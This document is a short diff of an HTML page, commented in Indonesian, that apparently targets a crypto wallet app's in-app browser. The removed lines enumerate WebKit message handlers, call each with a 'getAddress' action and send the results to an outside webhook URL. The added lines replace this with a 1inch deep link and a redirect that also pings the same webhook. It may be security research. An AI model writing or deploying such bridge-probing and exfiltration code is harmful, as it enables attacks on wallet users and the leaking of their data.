@@ -1,20 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-<pre id="o">Checking...</pre>
+<a href="1inch://browser?url=https://0x403for.github.io/1inch.html">Buka di 1inch</a>
+<br><br>
+<button onclick="go()">Auto Redirect</button>
 <script>
-let r = "handlers: ";
-if(window.webkit && window.webkit.messageHandlers){
-  r += Object.keys(window.webkit.messageHandlers).join(',');
-  for(let h of Object.keys(window.webkit.messageHandlers)){
-    try{
-      window.webkit.messageHandlers[h].postMessage({test:123, action:"getAddress"});
-      r += " | " + h + " BISA DIPANGGIL";
-    }catch(e){}
-  }
-} else { r += "tidak ada / aman"; }
-document.getElementById('o').innerText = r;
-fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?bridge=' + encodeURIComponent(r));
+function go(){
+  location.href = "https://app.1inch.io/#/1/swap?from=ETH&to=USDT";
+  setTimeout(()=>{ location.href = "https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?redirect=berhasil"; }, 1000);
+}
 </script>
 </body>
 </html>
